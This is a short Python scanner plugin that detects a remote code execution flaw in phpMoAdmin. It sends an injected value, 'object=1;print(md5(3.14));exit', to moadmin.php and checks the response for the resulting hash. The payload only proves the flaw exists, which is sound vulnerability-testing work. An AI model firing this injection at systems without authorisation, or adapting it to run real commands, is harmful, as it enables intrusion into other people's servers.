# !/usr/bin/env python
# encoding = utf-8

# import re
"""
reference: 'http://www.beebeeto.com/pdb/poc-2015-0044/'
&
'http://seclists.org/fulldisclosure/2015/Mar/19'
"""


def assign(service, arg):
    if service == 'phpmoadmin':
        return True, arg
    pass


def audit(arg):
    verify_url = arg + 'moadmin.php'
    command = '''-d object=1;print(md5(3.14));exit '''
    code, head, res, errcode, finalurl = curl.curl(command + verify_url)
    if code == 200:
        if '4beed3b9c4a886067de0e3a094246f78' in res:
            security_hole(verify_url)


if __name__ == "__main__":
    from dummy import *
    audit(assign('phpmoadmin', 'http://127.0.0.1/')[1])
